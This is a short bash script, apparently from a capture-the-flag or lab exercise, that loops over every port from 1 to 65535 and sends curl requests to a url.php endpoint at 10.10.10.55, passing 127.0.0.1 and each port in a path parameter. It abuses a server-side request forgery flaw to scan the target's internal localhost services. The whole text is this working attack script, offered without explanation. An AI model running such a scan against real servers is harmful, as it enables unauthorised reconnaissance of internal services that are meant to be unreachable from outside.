for i in {1..65535}
do
	echo "port $i"
    curl -s http://10.10.10.55:60000/url.php?path=127.0.0.1:"$i"  | tr '\n' ' '
done
